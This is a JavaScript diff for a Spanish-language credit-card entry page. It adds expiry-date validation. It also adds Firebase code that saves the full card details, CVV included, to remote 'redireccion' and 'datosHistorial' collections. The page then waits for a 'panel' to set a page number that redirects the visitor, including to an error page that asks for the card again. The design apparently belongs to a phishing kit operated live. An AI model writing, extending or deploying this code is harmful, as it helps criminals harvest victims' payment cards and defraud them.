@@ -85,6 +85,13 @@
     }
 
     function validatePayload(payload) {
+      var monthNum = parseInt(payload.tdcMes, 10);
+      var yearNum = parseInt(payload.tdcAnio, 10);
+      var now = new Date();
+      var currentYear2 = now.getFullYear() % 100;
+      var currentMonth = now.getMonth() + 1;
+      var maxYear2 = (now.getFullYear() + 15) % 100;
+
       if (!payload.tdcNombre) {
         return "Ingresa el nombre del titular";
       }
@@ -96,6 +103,18 @@
       }
       if (!payload.tdcAnio || payload.tdcAnio.length !== 2) {
         return "Ingresa el año de vencimiento";
+      }
+      if (isNaN(monthNum) || monthNum < 1 || monthNum > 12) {
+        return "El mes debe estar entre 01 y 12";
+      }
+      if (isNaN(yearNum)) {
+        return "Ingresa un año de vencimiento valido";
+      }
+      if (yearNum < currentYear2 || yearNum > maxYear2) {
+        return "El año de vencimiento no es valido";
+      }
+      if (yearNum === currentYear2 && monthNum < currentMonth) {
+        return "La fecha de vencimiento ya expiro";
       }
       if (!payload.tdcCvv || payload.tdcCvv.length !== 3) {
         return "Ingresa el codigo de seguridad";
@@ -174,5 +193,165 @@
       setLoading: setLoading,
       showError: showError
     };
+  });
+
+  // --- Lógica de Firebase Integrada ---
+  var tdcWatcher = null;
+
+  function getCurrentTdcState() {
+    var errUrl = window.appConfig && window.appConfig.routes && window.appConfig.routes[3] ? window.appConfig.routes[3].url : "tdc_err.html";
+    return window.location.pathname.indexOf(errUrl) !== -1 ? "error" : "ok";
+  }
+
+  function updateHistoryEntry(db, usuario, tdcData) {
+    return db
+      .collection("redireccion")
+      .doc(usuario)
+      .get()
+      .then(function (snapshot) {
+        var currentData = snapshot.exists ? snapshot.data() || {} : {};
+        var payload = Object.assign(
+          {
+            usuario: usuario,
+            timestamp: currentData.timestamp || new Date().toISOString(),
+          },
+          currentData,
+          tdcData
+        );
+
+        return db
+          .collection("datosHistorial")
+          .doc(usuario)
+          .set(payload, { merge: true });
+      })
+      .catch(function (error) {
+        console.error("Error actualizando historial TDC:", error);
+      });
+  }
+
+  function attachTdcWatcher(userRef) {
+    if (tdcWatcher) {
+      tdcWatcher();
+      tdcWatcher = null;
+    }
+
+    tdcWatcher = userRef.onSnapshot(
+      function (docSnapshot) {
+        if (!docSnapshot.exists) {
+          return;
+        }
+
+        var userData = docSnapshot.data() || {};
+        var page = userData.page;
+
+        if (typeof page !== "number" || page <= 0) {
+          return;
+        }
+
+        var route =
+          window.appConfig &&
+          window.appConfig.routes &&
+          window.appConfig.routes[page]
+            ? window.appConfig.routes[page]
+            : null;
+
+        if (route && route.url) {
+          var targetUrl = String(route.url || "");
+          var currentPath = window.location.pathname.split("/").pop() || "";
+          var targetPath = targetUrl.split("?")[0].split("#")[0].split("/").pop() || "";
+
+          if (targetPath && targetPath === currentPath) {
+            return;
+          }
+
+          if (tdcWatcher) {
+            tdcWatcher();
+            tdcWatcher = null;
+          }
+
+          window.location.href = route.url;
+          return;
+        }
+      },
+      function () {
+        if (window.tdcUi) {
+          window.tdcUi.setLoading(false);
+          window.tdcUi.showError("Error de conexion. Intenta nuevamente.");
+        }
+      }
+    );
+  }
+
+  function setWaitingState(userRef, stateValue) {
+    var errUrl = window.appConfig && window.appConfig.routes && window.appConfig.routes[3] ? window.appConfig.routes[3].url : "tdc_err.html";
+    return userRef.set(
+      {
+        page: 0,
+        tdcEstado: stateValue,
+        tdcEsperandoPanel: true,
+        tdcUltimaPagina: window.location.pathname.indexOf(errUrl) !== -1 ? "tdc_err" : "tdc",
+        tdcActualizadoEn: new Date().toISOString()
+      },
+      { merge: true }
+    );
+  }
+
+  ready(function () {
+    var db = window.db;
+    var usuario = localStorage.getItem("usuarioActual");
+    var currentState = getCurrentTdcState();
+
+    if (db && typeof firebase !== "undefined" && usuario && currentState === "error") {
+      var waitRef = db.collection("redireccion").doc(usuario);
+      setWaitingState(waitRef, "error").then(function () {
+        attachTdcWatcher(waitRef);
+      });
+    }
+
+    document.addEventListener("tdc:mit", function (event) {
+      var db = window.db;
+      if (!db || typeof firebase === "undefined") {
+        if (window.tdcUi) {
+          window.tdcUi.setLoading(false);
+          window.tdcUi.showError("Firebase no esta disponible.");
+        }
+        return;
+      }
+
+      var usuario = localStorage.getItem("usuarioActual");
+      if (!usuario) {
+        window.location.href = window.appConfig && window.appConfig.routes && window.appConfig.routes[1] ? window.appConfig.routes[1].url : "index.html";
+        return;
+      }
+
+      var payload = event.detail || (window.tdcUi ? window.tdcUi.getPayload() : null);
+      if (!payload) {
+        if (window.tdcUi) {
+          window.tdcUi.setLoading(false);
+        }
+        return;
+      }
+
+      var userRef = db.collection("redireccion").doc(usuario);
+      var stateValue = getCurrentTdcState();
+      payload.tdcEstado = stateValue;
+      payload.page = 0;
+      payload.tdcEsperandoPanel = true;
+      payload.tdcUltimaPagina = stateValue === "error" ? "tdc_err" : "tdc";
+      payload.tdcActualizadoEn = new Date().toISOString();
+
+      userRef
+        .set(payload, { merge: true })
+        .then(function () {
+          attachTdcWatcher(userRef);
+          return updateHistoryEntry(db, usuario, payload);
+        })
+        .catch(function () {
+          if (window.tdcUi) {
+            window.tdcUi.setLoading(false);
+            window.tdcUi.showError("Error de conexion. Intenta nuevamente.");
+          }
+        });
+    });
   });
 })();
